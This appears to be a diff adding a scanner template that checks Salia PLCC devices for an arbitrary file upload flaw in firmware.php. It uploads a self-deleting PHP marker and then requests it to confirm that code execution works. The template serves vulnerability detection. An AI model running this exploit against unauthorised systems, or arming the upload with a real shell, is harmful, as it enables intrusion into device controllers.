@@ -1,0 +1,42 @@
+id: poc-yaml-salia-plcc-firmware-php-anyfile-upload
+info:
+  name: Salia PLCC firmware.php Arbitrary File Upload
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+http:
+  - raw:
+      - |
+        POST /firmware.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
+        
+        ------WebKitFormBoundary
+        Content-Disposition: form-data; name="media"; filename="{{t1}}.php"
+
+        <?=md5({{t1}});unlink(__FILE__);
+        ------WebKitFormBoundary--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "Firmware"
+          - "has been uploaded successfully"
+  - raw:
+      - |
+        GET /uploads/{{t1}}.php HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{t2}}"
